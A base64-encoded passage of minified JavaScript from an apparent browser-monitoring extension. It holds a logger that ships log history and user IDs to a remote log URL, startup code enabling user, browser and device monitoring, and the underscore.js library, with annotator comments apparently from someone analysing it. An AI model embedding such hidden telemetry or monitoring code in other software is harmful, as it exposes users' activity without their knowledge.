uZyI9PXR5cGVvZiBlP2U6IiJ9LGUuc3RyaW5naWZ5X2FueXRoaW5nPWZ1bmN0aW9uKGUpe2lmKCJ1bmRlZmluZWQiPT10eXBlb2YgZSlyZXR1cm4idW5kZWZpbmVkIjtpZihudWxsPT09ZSlyZXR1cm4ibnVsbCI7aWYoIm9iamVjdCI9PXR5cGVvZiBlKXt2YXIgdCxuPWUuX2NsYXNzO3RyeXt0PUpTT04uc3RyaW5naWZ5KGUpfWNhdGNoKHIpe31pZih0JiZ0Lmxlbmd0aDw1MTIpcmV0dXJuIG4/IlsiK24rIiAiK3QrIl0iOnR9cmV0dXJuIFN0cmluZyhlKX0sZS5jb25zb2xlX2xvZz1mdW5jdGlvbihlLHQpe3Q9dGhpcy5wcmVwX2FyZ3ModCksd2luZG93LmNvbnNvbGVbZV0uYXBwbHkod2luZG93LmNvbnNvbGUsdCl9LGUuc3RvcmVfaGlzdG9yeT1mdW5jdGlvbihlLHQpe3Q9W10uc2xpY2UuY2FsbCh0KSx0LnVuc2hpZnQoZSksdC51bnNoaWZ0KHRoaXMudGFnKSx0PXUubWFwKHQsdGhpcy5zdHJpbmdpZnlfYW55dGhpbmcpLHQudW5zaGlmdCgobmV3IERhdGUpLmdldFRpbWUoKSksby5wdXNoKHQpfSxlLnByZXBfYXJncz1mdW5jdGlvbihlKXtyZXR1cm4gZT1BcnJheS5wcm90b3R5cGUuc2xpY2UuY2FsbChlKSx0aGlzLnRhZyYmZS51bnNoaWZ0KCJbIit0aGlzLnRhZysiXSIpLGV9LGUuZD1mdW5jdGlvbigpe3RoaXMuc3RvcmVfaGlzdG9yeSgiZGVidWciLGFyZ3VtZW50cyksdGhpcy5jb25zb2xlX2xvZygibG9nIixhcmd1bWVudHMpfSxlLmk9ZnVuY3Rpb24oKXt0aGlzLnN0b3JlX2hpc3RvcnkoImluZm8iLGFyZ3VtZW50cyksdGhpcy5jb25zb2xlX2xvZygiaW5mbyIsYXJndW1lbnRzKX0sZS53PWZ1bmN0aW9uKCl7dGhpcy5zdG9yZV9oaXN0b3J5KCJ3YXJuIixhcmd1bWVudHMpLHRoaXMuY29uc29sZV9sb2coIndhcm4iLGFyZ3VtZW50cyl9LGUuZT1mdW5jdGlvbigpe3RoaXMuc3RvcmVfaGlzdG9yeSgiZXJyb3IiLGFyZ3VtZW50cyksdGhpcy5jb25zb2xlX2xvZygiZXJyb3IiLGFyZ3VtZW50cyl9LGUuYXVkaXQ9ZnVuY3Rpb24oZSx0KXt2YXIgcz1uKDQpLG89big1KTtvLmxvZ191cmwmJnMucmVhZHkudGhlbihmdW5jdGlvbigpe3ZhciBuPXIoKTtpZihuLnNhdmVfYXVkaXQpe3ZhciB1PXtfdGltZXN0YW1wOihuZXcgRGF0ZSkuZ2V0VGltZSgpLHR5cGU6ZSxpbnN0YW5jZV9pZDpvLmluc3RhbmNlX2lkLGJyb3dzZXJfdmVyc2lvbjpvLmJyb3dzZXJfdmVyc2lvbixleHRlbnNpb25fdmVyc2lvbjpvLmV4dGVuc2lvbl92ZXJzaW9uLHVzZXJfbGlzdDpzLnVzZXJzLnBsdWNrKCJpZCIpLGV4dHJhOnR9O2EucHVzaCh1KSxpKCl9fSl9fShkLnByb3RvdHlwZSksZS5leHBvcnRzPWZ1bmN0aW9uKGUpe3JldHVybiBuZXcgZChlKX0sZS5leHBvcnRzLkxvZ2dlcj1kLGUuZXhwb3J0cy5oaXN0b3J5PW87dmFyIGg9MDtlLmV4cG9ydHMuc2F2ZUhpc3Rvcnk9ZnVuY3Rpb24oKXt2YXIgZT1uKDUpLHQ9cigpO2lmKGUubG9nX3VybCYmdC5zYXZlX2xvZyYmd2luZG93Lm5hdmlnYXRvci5vbkxpbmUpe3ZhciBpPW8uc2xpY2UoaCk7aS5sZW5ndGgmJihoKz1pLmxlbmd0aCxpPWkuZmlsdGVyKGZ1bmN0aW9uKGUpe3N3aXRjaChlWzJdKXtjYXNlImRlYnVnIjpyZXR1cm4tMSE9PVsiZGVidWciXS5pbmRleE9mKHQubG9nX2xldmVsKTtjYXNlImluZm8iOnJldHVybi0xIT09WyJkZWJ1ZyIsImluZm8iXS5pbmRleE9mKHQubG9nX2xldmVsKTtjYXNlIndhcm4iOnJldHVybi0xIT09WyJkZWJ1ZyIsImluZm8iLCJ3YXJuIl0uaW5kZXhPZih0LmxvZ19sZXZlbCk7Y2FzZSJlcnJvciI6cmV0dXJuLTEhPT1bImRlYnVnIiwiaW5mbyIsIndhcm4iLCJlcnJvciJdLmluZGV4T2YodC5sb2dfbGV2ZWwpfX0pLGkubGVuZ3RoJiZjKHttZXRob2Q6InBvc3QiLHVybDplLmxvZ191cmwrIi9qYXZhc2NyaXB0IixkYXRhOntsb2dEYXRhOmksY3VycmVudF90aW1lOihuZXcgRGF0ZSkuZ2V0VGltZSgpLGluc3RhbmNlX2lkOmUuaW5zdGFuY2VfaWQsYnJvd3Nlcl92ZXJzaW9uOmUuYnJvd3Nlcl92ZXJzaW9uLGV4dGVuc2lvbl92ZXJzaW9uOmUuZXh0ZW5zaW9uX3ZlcnNpb259LHJldHJ5VGltZW91dDo2MCxvblJldHJ5OmZ1bmN0aW9uKGUsdCxuKXtjb25zb2xlLndhcm4oIkZhaWxlZCB0byBzYXZlIGphdmFzY3JpcHQgbG9nLCByZXRyeWluZyBpbiAiK24rIiBzZWNvbmRzICgiLGUsIikiKX19KSl9fSxlLmV4cG9ydHMudGhyb3R0bGVTYXZlSGlzdG9yeT11LnRocm90dGxlKGUuZXhwb3J0cy5zYXZlSGlzdG9yeSw2ZTQpLGUuZXhwb3J0cy5kdW1wSGlzdG9yeT1mdW5jdGlvbigpe2NvbnNvbGUuZ3JvdXAoIkxvZyBoaXN0b3J5Iiksby5mb3JFYWNoKGZ1bmN0aW9uKGUpe3ZhciB0PSJjb2xvcjogcmVkOyI7c3dpdGNoKGVbMl0pe2Nhc2UiZGVidWciOnQ9ImNvbG9yOiBncmV5OyJ9Y29uc29sZS5sb2coIiVjJXMgJXMgJXMiLHQscyhlWzBdKSwiWyIrZVsxXSsiXSIsZS5zbGljZSgzKS5qb2luKCIgIikpfSksY29uc29sZS5ncm91cEVuZCgpfSxlLmV4cG9ydHMuc3RhcnRMb2dTaGlwcGluZz1mdW5jdGlvbigpe3RoaXMuaGlzdG9yeVRpbWVyPXNldEludGVydmFsKGUuZXhwb3J0cy50aHJvdHRsZVNhdmVIaXN0b3J5LDFlMyksd2luZG93Lm9udW5sb2FkPWUuZXhwb3J0cy5zYXZlSGlzdG9yeSx0aGlzLmF1ZGl0VGltZXI9c2V0SW50ZXJ2YWwoaSwxZTQpfX0NCi8qIHNvbWUgc29ydCBvZiBkZWJ1ZyByZXBvcnRpbmcgc2NyaXB0IC0tPiAqLw0KLA0KLyogPCEtLSBhcHAgaW5pdGlhbGl6YXRpb24gKEludGVyZXN0aW5nIGFkbWluIHN0cmluZykgKi8NCmZ1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7dmFyIHI9bigxMSksaT1uKDMpKCJhcHAiKSxzPWUuZXhwb3J0cz17fSxvPW4oMjUpO3MucmVhZHk9bmV3IHIoZnVuY3Rpb24oZSl7dGhpcy5zdGFydD1mdW5jdGlvbih0KXt2YXIgaT1uKDgpLHM9bigzMyksbz1uKDUpO28ucmVhZHkudGhlbihmdW5jdGlvbigpe3RoaXMudXNlcnM9bmV3IHMuVXNlcnMsdGhpcy5nbG9iYWxDb25maWc9bmV3IHMuR2xvYmFsQ29uZmlnO3ZhciBvPVt0aGlzLmdsb2JhbENvbmZpZy5yZWFkeV07aWYobigzKS5zdGFydExvZ1NoaXBwaW5nKCksdD10aGlzLm9wdD1pLmV4dGVuZCh7c3RhcnRNZXNzYWdpbmc6ITAsc3RhcnRJbnRlcmFjdDohMCxzdGFydFVzZXJNb25pdG9yOiEwLHN0YXJ0QWN0aXZpdHlTdHJlYW06ITAsc3RhcnRCcm93c2VyTW9uaXRvcjohMCxzdGFydERldmljZVN0YXR1czohMH0sdCksdC5zdGFydE1lc3NhZ2luZyl7dmFyIGE9bigxNDYpO3RoaXMubWVzc2FnaW5nPW5ldyBhLHRoaXMucHVzaGVyPWEucHVzaGVyT2JqZWN0fXQuc3RhcnRBY3Rpdml0eVN0cmVhbSYmKHRoaXMuYWN0aXZpdHlTdHJlYW09big5KSksdC5zdGFydEludGVyYWN0JiYodGhpcy5pbnRlcmFjdD1uKDE2KSksdC5zdGFydFVzZXJNb25pdG9yJiYodGhpcy51c2VyTW9uaXRvcmluZz1uKDE0Nyksby5wdXNoKHRoaXMudXNlck1vbml0b3JpbmcucmVhZHkpKSx0LnN0YXJ0QnJvd3Nlck1vbml0b3ImJih0aGlzLmJyb3dzZXJNb25pdG9yPW4oMTUzKSksdC5zdGFydERldmljZVN0YXR1cyYmKHRoaXMuZGV2aWNlU3RhdHVzPW4oMTU2KSksci5hbGwobykudGhlbihlKX0uYmluZCh0aGlzKSl9fS5iaW5kKHMpKSxzLnJlYWR5LnRoZW4oZnVuY3Rpb24oKXtjaHJvbWUucnVudGltZS5vbk1lc3NhZ2UuYWRkTGlzdGVuZXIoZnVuY3Rpb24oZSx0LG4pe3N3aXRjaChlLnR5cGUpe2Nhc2UiZGlhZ25vc3RpY3Muc2VsZl9yZXBhaXIiOnJldHVybiBpLmkoInN0YXJ0IHNlbGYgcmVwYWlyaW5nIiksby53YXRjaCgpLHMucHVzaGVyKCkuZGlzY29ubmVjdCgpLHMudXNlcnMucmVmcmVzaENvbmZpZyghMCksc2V0VGltZW91dChmdW5jdGlvbigpe3MucHVzaGVyKCkuY29ubmVjdCgpLGkuaSgiZW5kIHNlbGYgcmVwYWlyaW5nIil9LDFlNCksITE7Y2FzZSJkaWFnbm9zdGljcy5nZXRfdXNlcnMiOnJldHVybiBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7bihzLnVzZXJzKX0sNmUzKSwhMH19KX0pfSxmdW5jdGlvbihlLHQsbil7dmFyIHI9big4KSxpPW4oMTU0KTtyLmV4dGVuZChpLG4oMTU1KSksZS5leHBvcnRzPWl9LCwsZnVuY3Rpb24oZSx0LG4pe3ZhciByLGk7KGZ1bmN0aW9uKCl7ZnVuY3Rpb24gbihlKXtmdW5jdGlvbiB0KHQsbixyLGkscyxvKXtmb3IoO3M+PTAmJm8+cztzKz1lKXt2YXIgYT1pP2lbc106cztyPW4ocix0W2FdLGEsdCl9cmV0dXJuIHJ9cmV0dXJuIGZ1bmN0aW9uKG4scixpLHMpe3I9ayhyLHMsNCk7dmFyIG89IWoobikmJkwua2V5cyhuKSxhPShvfHxuKS5sZW5ndGgsdT1lPjA/MDphLTE7cmV0dXJuIGFyZ3VtZW50cy5sZW5ndGg8MyYmKGk9bltvP29bdV06dV0sdSs9ZSksdChuLHIsaSxvLHUsYSl9fWZ1bmN0aW9uIHMoZSl7cmV0dXJuIGZ1bmN0aW9uKHQsbixyKXtuPXcobixyKTtmb3IodmFyIGk9eCh0KSxzPWU+MD8wOmktMTtzPj0wJiZpPnM7cys9ZSlpZihuKHRbc10scyx0KSlyZXR1cm4gcztyZXR1cm4tMX19ZnVuY3Rpb24gbyhlLHQsbil7cmV0dXJuIGZ1bmN0aW9uKHIsaSxzKXt2YXIgbz0wLGE9eChyKTtpZigibnVtYmVyIj09dHlwZW9mIHMpZT4wP289cz49MD9zOk1hdGgubWF4KHMrYSxvKTphPXM+PTA/TWF0aC5taW4ocysxLGEpOnMrYSsxO2Vsc2UgaWYobiYmcyYmYSlyZXR1cm4gcz1uKHIsaSkscltzXT09PWk/czotMTtpZihpIT09aSlyZXR1cm4gcz10KHAuY2FsbChyLG8sYSksTC5pc05hTikscz49MD9zK286LTE7Zm9yKHM9ZT4wP286YS0xO3M+PTAmJmE+cztzKz1lKWlmKHJbc109PT1pKXJldHVybiBzO3JldHVybi0xfX1mdW5jdGlvbiBhKGUsdCl7dmFyIG49Qy5sZW5ndGgscj1lLmNvbnN0cnVjdG9yLGk9TC5pc0Z1bmN0aW9uKHIpJiZyLnByb3RvdHlwZXx8ZCxzPSJjb25zdHJ1Y3RvciI7Zm9yKEwuaGFzKGUscykmJiFMLmNvbnRhaW5zKHQscykmJnQucHVzaChzKTtuLS07KXM9Q1tuXSxzIGluIGUmJmVbc10hPT1pW3NdJiYhTC5jb250YWlucyh0LHMpJiZ0LnB1c2gocyl9dmFyIHU9dGhpcyxjPXUuXyxsPUFycmF5LnByb3RvdHlwZSxkPU9iamVjdC5wcm90b3R5cGUsaD1GdW5jdGlvbi5wcm90b3R5cGUsZj1sLnB1c2gscD1sLnNsaWNlLF89ZC50b1N0cmluZyxtPWQuaGFzT3duUHJvcGVydHkseT1BcnJheS5pc0FycmF5LGc9T2JqZWN0LmtleXMsdj1oLmJpbmQsYj1PYmplY3QuY3JlYXRlLE09ZnVuY3Rpb24oKXt9LEw9ZnVuY3Rpb24oZSl7cmV0dXJuIGUgaW5zdGFuY2VvZiBMP2U6dGhpcyBpbnN0YW5jZW9mIEw/dm9pZCh0aGlzLl93cmFwcGVkPWUpOm5ldyBMKGUpfTsidW5kZWZpbmVkIiE9dHlwZW9mIGUmJmUuZXhwb3J0cyYmKHQ9ZS5leHBvcnRzPUwpLHQuXz1MLEwuVkVSU0lPTj0iMS44LjMiO3ZhciBrPWZ1bmN0aW9uKGUsdCxuKXtpZih2b2lkIDA9PT10KXJldHVybiBlO3N3aXRjaChudWxsPT1uPzM6bil7Y2FzZSAxOnJldHVybiBmdW5jdGlvbihuKXtyZXR1cm4gZS5jYWxsKHQsbil9O2Nhc2UgMjpyZXR1cm4gZnVuY3Rpb24obixyKXtyZXR1cm4gZS5jYWxsKHQsbixyKX07Y2FzZSAzOnJldHVybiBmdW5jdGlvbihuLHIsaSl7cmV0dXJuIGUuY2FsbCh0LG4scixpKX07Y2FzZSA0OnJldHVybiBmdW5jdGlvbihuLHIsaSxzKXtyZXR1cm4gZS5jYWxsKHQsbixyLGkscyl9fXJldHVybiBmdW5jdGlvbigpe3JldHVybiBlLmFwcGx5KHQsYXJndW1lbnRzKX19LHc9ZnVuY3Rpb24oZSx0LG4pe3JldHVybiBudWxsPT1lP0wuaWRlbnRpdHk6TC5pc0Z1bmN0aW9uKGUpP2soZSx0LG4pOkwuaXNPYmplY3QoZSk/TC5tYXRjaGVyKGUpOkwucHJvcGVydHkoZSl9O0wuaXRlcmF0ZWU9ZnVuY3Rpb24oZSx0KXtyZXR1cm4gdyhlLHQsMS8wKX07dmFyIFQ9ZnVuY3Rpb24oZSx0KXtyZXR1cm4gZnVuY3Rpb24obil7dmFyIHI9YXJndW1lbnRzLmxlbmd0aDtpZigyPnJ8fG51bGw9PW4pcmV0dXJuIG47Zm9yKHZhciBpPTE7cj5pO2krKylmb3IodmFyIHM9YXJndW1lbnRzW2ldLG89ZShzKSxhPW8ubGVuZ3RoLHU9MDthPnU7dSsrKXt2YXIgYz1vW3VdO3QmJnZvaWQgMCE9PW5bY118fChuW2NdPXNbY10pfXJldHVybiBufX0sWT1mdW5jdGlvbihlKXtpZighTC5pc09iamVjdChlKSlyZXR1cm57fTtpZihiKXJldHVybiBiKGUpO00ucHJvdG90eXBlPWU7dmFyIHQ9bmV3IE07cmV0dXJuIE0ucHJvdG90eXBlPW51bGwsdH0sRD1mdW5jdGlvbihlKXtyZXR1cm4gZnVuY3Rpb24odCl7cmV0dXJuIG51bGw9PXQ/dm9pZCAwOnRbZV19fSxTPU1hdGgucG93KDIsNTMpLTEseD1EKCJsZW5ndGgiKSxqPWZ1bmN0aW9uKGUpe3ZhciB0PXgoZSk7cmV0dXJuIm51bWJlciI9PXR5cGVvZiB0JiZ0Pj0wJiZTPj10fTtMLmVhY2g9TC5mb3JFYWNoPWZ1bmN0aW9uKGUsdCxuKXt0PWsodCxuKTt2YXIgcixpO2lmKGooZSkpZm9yKHI9MCxpPWUubGVuZ3RoO2k+cjtyKyspdChlW3JdLHIsZSk7ZWxzZXt2YXIgcz1MLmtleXMoZSk7Zm9yKHI9MCxpPXMubGVuZ3RoO2k+cjtyKyspdChlW3Nbcl1dLHNbcl0sZSl9cmV0dXJuIGV9LEwubWFwPUwuY29sbGVjdD1mdW5jdGlvbihlLHQsbil7dD13KHQsbik7Zm9yKHZhciByPSFqKGUpJiZMLmtleXMoZSksaT0ocnx8ZSkubGVuZ3RoLHM9QXJyYXkoaSksbz0wO2k+bztvKyspe3ZhciBhPXI/cltvXTpvO3Nbb109dChlW2FdLGEsZSl9cmV0dXJuIHN9LEwucmVkdWNlPUwuZm9sZGw9TC5pbmplY3Q9bigxKSxMLnJlZHVjZVJpZ2h0PUwuZm9sZHI9bigtMSksTC5maW5kPUwuZGV0ZWN0PWZ1bmN0aW9uKGUsdCxuKXt2YXIgcjtyZXR1cm4gcj1qKGUpP0wuZmluZEluZGV4KGUsdCxuKTpMLmZpbmRLZXkoZSx0LG4pLHZvaWQgMCE9PXImJi0xIT09cj9lW3JdOnZvaWQgMH0sTC5maWx0ZXI9TC5zZWxlY3Q9ZnVuY3Rpb24oZSx0LG4pe3ZhciByPVtdO3JldHVybiB0PXcodCxuKSxMLmVhY2goZSxmdW5jdGlvbihlLG4saSl7dChlLG4saSkmJnIucHVzaChlKX0pLHJ9LEwucmVqZWN0PWZ1bmN0aW9uKGUsdCxuKXtyZXR1cm4gTC5maWx0ZXIoZSxMLm5lZ2F0ZSh3KHQpKSxuKX0sTC5ldmVyeT1MLmFsbD1mdW5jdGlvbihlLHQsbil7dD13KHQsbik7Zm9yKHZhciByPSFqKGUpJiZMLmtleXMoZSksaT0ocnx8ZSkubGVuZ3RoLHM9MDtpPnM7cysrKXt2YXIgbz1yP3Jbc106cztpZighdChlW29dLG8sZSkpcmV0dXJuITF9cmV0dXJuITB9LEwuc29tZT1MLmFueT1mdW5jdGlvbihlLHQsbil7dD13KHQsbik7Zm9yKHZhciByPSFqKGUpJiZMLmtleXMoZSksaT0ocnx8ZSkubGVuZ3RoLHM9MDtpPnM7cysrKXt2YXIgbz1yP3Jbc106cztpZih0KGVbb10sbyxlKSlyZXR1cm4hMH1yZXR1cm4hMX0sTC5jb250YWlucz1MLmluY2x1ZGVzPUwuaW5jbHVkZT1mdW5jdGlvbihlLHQsbixyKXtyZXR1cm4gaihlKXx8KGU9TC52YWx1ZXMoZSkpLCgibnVtYmVyIiE9dHlwZW9mIG58fHIpJiYobj0wKSxMLmluZGV4T2YoZSx0LG4pPj0wfSxMLmludm9rZT1mdW5jdGlvbihlLHQpe3ZhciBuPXAuY2FsbChhcmd1bWVudHMsMikscj1MLmlzRnVuY3Rpb24odCk7cmV0dXJuIEwubWFwKGUsZnVuY3Rpb24oZSl7dmFyIGk9cj90OmVbdF07cmV0dXJuIG51bGw9PWk/aTppLmFwcGx5KGUsbil9KX0sTC5wbHVjaz1mdW5jdGlvbihlLHQpe3JldHVybiBMLm1hcChlLEwucHJvcGVydHkodCkpfSxMLndoZXJlPWZ1bmN0aW9uKGUsdCl7cmV0dXJuIEwuZmlsdGVyKGUsTC5tYXRjaGVyKHQpKX0sTC5maW5kV2hlcmU9ZnVuY3Rpb24oZSx0KXtyZXR1cm4gTC5maW5kKGUsTC5tYXRjaGVyKHQpKX0sTC5tYXg9ZnVuY3Rpb24oZSx0LG4pe3ZhciByLGkscz0tKDEvMCksbz0tKDEvMCk7aWYobnVsbD09dCYmbnVsbCE9ZSl7ZT1qKGUpP2U6TC52YWx1ZXMoZSk7Zm9yKHZhciBhPTAsdT1lLmxlbmd0aDt1PmE7YSsrKXI9ZVthXSxyPnMmJihzPXIpfWVsc2UgdD13KHQsbiksTC5lYWNoKGUsZnVuY3Rpb24oZSxuLHIpe2k9dChlLG4sciksKGk+b3x8aT09PS0oMS8wKSYmcz09PS0oMS8wKSkmJihzPWUsbz1pKX0pO3JldHVybiBzfSxMLm1pbj1mdW5jdGlvbihlLHQsbil7dmFyIHIsaSxzPTEvMCxvPTEvMDtpZihudWxsPT10JiZudWxsIT1lKXtlPWooZSk/ZTpMLnZhbHVlcyhlKTtmb3IodmFyIGE9MCx1PWUubGVuZ3RoO3U+YTthKyspcj1lW2FdLHM+ciYmKHM9cil9ZWxzZSB0PXcodCxuKSxMLmVhY2goZSxmdW5jdGlvbihlLG4scil7aT10KGUsbixyKSwobz5pfHxpPT09MS8wJiZzPT09MS8wKSYmKHM9ZSxvPWkpfSk7cmV0dXJuIHN9LEwuc2h1ZmZsZT1mdW5jdGlvbihlKXtmb3IodmFyIHQsbj1qKGUpP2U6TC52YWx1ZXMoZSkscj1uLmxlbmd0aCxpPUFycmF5KHIpLHM9MDtyPnM7cysrKXQ9TC5yYW5kb20oMCxzKSx0IT09cyYmKGlbc109aVt0XSksaVt0XT1uW3NdO3JldHVybiBpfSxMLnNhbXBsZT1mdW5jdGlvbihlLHQsbil7cmV0dXJuIG51bGw9PXR8fG4/KGooZSl8fChlPUwudmFsdWVzKGUpKSxlW0wucmFuZG9tKGUubGVuZ3RoLTEpXSk6TC5zaHVmZmxlKGUpLnNsaWNlKDAsTWF0aC5tYXgoMCx0KSl9LEwuc29ydEJ5PWZ1bmN0aW9uKGUsdCxuKXtyZXR1cm4gdD13KHQsbiksTC5wbHVjayhMLm1hcChlLGZ1bmN0aW9uKGUsbixyKXtyZXR1cm57dmFsdWU6ZSxpbmRleDpuLGNyaXRlcmlhOnQoZSxuLHIpfX0pLnNvcnQoZnVuY3Rpb24oZSx0KXt2YXIgbj1lLmNyaXRlcmlhLHI9dC5jcml0ZXJpYTtpZihuIT09cil7aWYobj5yfHx2b2lkIDA9PT1uKXJldHVybiAxO2lmKHI+bnx8dm9pZCAwPT09cilyZXR1cm4tMX1yZXR1cm4gZS5pbmRleC10LmluZGV4fSksInZhbHVlIil9O3ZhciBIPWZ1bmN0aW9uKGUpe3JldHVybiBmdW5jdGlvbih0LG4scil7dmFyIGk9e307cmV0dXJuIG49dyhuLHIpLEwuZWFjaCh0LGZ1bmN0aW9uKHIscyl7dmFyIG89bihyLHMsdCk7ZShpLHIsbyl9KSxpfX07TC5ncm91cEJ5PUgoZnVuY3Rpb24oZSx0LG4pe0wuaGFzKGUsbik/ZVtuXS5wdXNoKHQpOmVbbl09W3RdfSksTC5pbmRleEJ5PUgoZnVuY3Rpb24oZSx0LG4pe2Vbbl09dH0pLEwuY291bnRCeT1IKGZ1bmN0aW9uKGUsdCxuKXtMLmhhcyhlLG4pP2Vbbl0rKzplW25dPTF9KSxMLnRvQXJyYXk9ZnVuY3Rpb24oZSl7cmV0dXJuIGU/TC5pc0FycmF5KGUpP3AuY2FsbChlKTpqKGUpP0wubWFwKGUsTC5pZGVudGl0eSk6TC52YWx1ZXMoZSk6W119LEwuc2l6ZT1mdW5jdGlvbihlKXtyZXR1cm4gbnVsbD09ZT8wOmooZSk/ZS5sZW5ndGg6TC5rZXlzKGUpLmxlbmd0aH0sTC5wYXJ0aXRpb249ZnVuY3Rpb24oZSx0LG4pe3Q9dyh0LG4pO3ZhciByPVtdLGk9W107cmV0dXJuIEwuZWFjaChlLGZ1bmN0aW9uKGUsbixzKXsodChlLG4scyk/cjppKS5wdXNoKGUpfSksW3IsaV19LEwuZmlyc3Q9TC5oZWFkPUwudGFrZT1mdW5jdGlvbihlLHQsbil7cmV0dXJuIG51bGwhPWU/bnVsbD09dHx8bj9lWzBdOkwuaW5pdGlhbChlLGUubGVuZ3RoLXQpOnZvaWQgMH0sTC5pbml0aWFsPWZ1bmN0aW9uKGUsdCxuKXtyZXR1cm4gcC5jYWxsKGUsMCxNYXRoLm1heCgwLGUubGVuZ3RoLShudWxsPT10fHxuPzE6dCkpKX0sTC5sYXN0PWZ1bmN0aW9uKGUsdCxuKXtyZXR1cm4gbnVsbCE9ZT9udWxsPT10fHxuP2VbZS5sZW5ndGgtMV06TC5yZXN0KGUsTWF0aC5tYXgoMCxlLmxlbmd0aC10KSk6dm9pZCAwfSxMLnJlc3Q9TC50YWlsPUwuZHJvcD1mdW5jdGlvbihlLHQsbil7cmV0dXJuIHAuY2FsbChlLG51bGw9PXR8fG4/MTp0KX0sTC5jb21wYWN0PWZ1bmN0aW9uKGUpe3JldHVybiBMLmZpbHRlcihlLEwuaWRlbnRpdHkpfTt2YXIgUD1mdW5jdGlvbihlLHQsbixyKXtmb3IodmFyIGk9W10scz0wLG89cnx8MCxhPXgoZSk7YT5vO28rKyl7dmFyIHU9ZVtvXTtpZihqKHUpJiYoTC5pc0FycmF5KHUpfHxMLmlzQXJndW1lbnRzKHUpKSl7dHx8KHU9UCh1LHQsbikpO3ZhciBjPTAsbD11Lmxlbmd0aDtmb3IoaS5sZW5ndGgrPWw7bD5jOylpW3MrK109dVtjKytdfWVsc2Ugbnx8KGlbcysrXT11KX1yZXR1cm4gaX07TC5mbGF0dGVuPWZ1bmN0aW9uKGUsdCl7cmV0dXJuIFAoZSx0LCExKX0sTC53aXRob3V0PWZ1bmN0aW9uKGUpe3JldHVybiBMLmRpZmZlcmVuY2UoZSxwLmNhbGwoYXJndW1lbnRzLDEpKX0sTC51bmlxPUwudW5pcXVlPWZ1bmN0aW9uKGUsdCxuLHIpe0wuaXNCb29sZWFuKHQpfHwocj1uLG49dCx0PSExKSxudWxsIT1uJiYobj13KG4scikpO2Zvcih2YXIgaT1bXSxzPVtdLG89MCxhPXgoZSk7YT5vO28rKyl7dmFyIHU9ZVtvXSxjPW4/bih1LG8sZSk6dTt0PyhvJiZzPT09Y3x8aS5wdXNoKHUpLHM9Yyk6bj9MLmNvbnRhaW5zKHMsYyl8fChzLnB1c2goYyksaS5wdXNoKHUpKTpMLmNvbnRhaW5zKGksdSl8fGkucHVzaCh1KX1yZXR1cm4gaX0sTC51bmlvbj1mdW5jdGlvbigpe3JldHVybiBMLnVuaXEoUChhcmd1bWVudHMsITAsITApKX0sTC5pbnRlcnNlY3Rpb249ZnVuY3Rpb24oZSl7Zm9yKHZhciB0PVtdLG49YXJndW1lbnRzLmxlbmd0aCxyPTAsaT14KGUpO2k+cjtyKyspe3ZhciBzPWVbcl07aWYoIUwuY29udGFpbnModCxzKSl7Zm9yKHZhciBvPTE7bj5vJiZMLmNvbnRhaW5zKGFyZ3VtZW50c1tvXSxzKTtvKyspO289PT1uJiZ0LnB1c2gocyl9fXJldHVybiB0fSxMLmRpZmZlcmVuY2U9ZnVuY3Rpb24oZSl7dmFyIHQ9UChhcmd1bWVudHMsITAsITAsMSk7cmV0dXJuIEwuZmlsdGVyKGUsZnVuY3Rpb24oZSl7cmV0dXJuIUwuY29udGFpbnModCxlKX0pfSxMLnppcD1mdW5jdGlvbigpe3JldHVybiBMLnVuemlwKGFyZ3VtZW50cyl9LEwudW56aXA9ZnVuY3Rpb24oZSl7Zm9yKHZhciB0PWUmJkwubWF4KGUseCkubGVuZ3RofHwwLG49QXJyYXkodCkscj0wO3Q+cjtyKyspbltyXT1MLnBsdWNrKGUscik7cmV0dXJuIG59LEwub2JqZWN0PWZ1bmN0aW9uKGUsdCl7Zm9yKHZhciBuPXt9LHI9MCxpPXgoZSk7aT5yO3IrKyl0P25bZVtyXV09dFtyXTpuW2Vbcl1bMF1dPWVbcl1bMV07cmV0dXJuIG59LEwuZmluZEluZGV4PXMoMSksTC5maW5kTGFzdEluZGV4PXMoLTEpLEwuc29ydGVkSW5kZXg9ZnVuY3Rpb24oZSx0LG4scil7bj13KG4sciwxKTtmb3IodmFyIGk9bih0KSxzPTAsbz14KGUpO28+czspe3ZhciBhPU1hdGguZmxvb3IoKHMrbykvMik7bihlW2FdKTxpP3M9YSsxOm89YX1yZXR1cm4gc30sTC5pbmRleE9mPW8oMSxMLmZpbmRJbmRleCxMLnNvcnRlZEluZGV4KSxMLmxhc3RJbmRleE9mPW8oLTEsTC5maW5kTGFzdEluZGV4KSxMLnJhbmdlPWZ1bmN0aW9uKGUsdCxuKXtudWxsPT10JiYodD1lfHwwLGU9MCksbj1ufHwxO2Zvcih2YXIgcj1NYXRoLm1heChNYXRoLmNlaWwoKHQtZSkvbiksMCksaT1BcnJheShyKSxzPTA7cj5zO3MrKyxlKz1uKWlbc109ZTtyZXR1cm4gaX07dmFyIEU9ZnVuY3Rpb24oZSx0LG4scixpKXtpZighKHIgaW5zdGFuY2VvZiB0KSlyZXR1cm4gZS5hcHBseShuLGkpO3ZhciBzPVkoZS5wcm90b3R5cGUpLG89ZS5hcHBseShzLGkpO3JldHVybiBMLmlzT2JqZWN0KG8pP286c307TC5iaW5kPWZ1bmN0aW9uKGUsdCl7aWYodiYmZS5iaW5kPT09dilyZXR1cm4gdi5hcHBseShlLHAuY2FsbChhcmd1bWVudHMsMSkpO2lmKCFMLmlzRnVuY3Rpb24oZSkpdGhyb3cgbmV3IFR5cGVFcnJvcigiQmluZCBtdXN0IGJlIGNhbGxlZCBvbiBhIGZ1bmN0aW9uIik7dmFyIG49cC5jYWxsKGFyZ3VtZW50cywyKSxyPWZ1bmN0aW9uKCl7cmV0dXJuIEUoZSxyLHQsdGhpcyxuLmNvbmNhdChwLmNhbGwoYXJndW1lbnRzKSkpfTtyZXR1cm4gcn0sTC5wYXJ0aWFsPWZ1bmN0aW9uKGUpe3ZhciB0PXAuY2FsbChhcmd1bWVudHMsMSksbj1mdW5jdGlvbigpe2Zvcih2YXIgcj0wLGk9dC5sZW5ndGgscz1BcnJheShpKSxvPTA7aT5vO28rKylzW29dPXRbb109PT1MP2FyZ3VtZW50c1tyKytdOnRbb107Zm9yKDtyPGFyZ3VtZW50cy5sZW5ndGg7KXMucHVzaChhcmd1bWVudHNbcisrXSk7cmV0dXJuIEUoZSxuLHRoaXMsdGhpcyxzKX07cmV0dXJuIG59LEwuYmluZEFsbD1mdW5jdGlvbihlKXt2YXIgdCxuLHI9YXJndW1lbnRzLmxlbmd0aDtp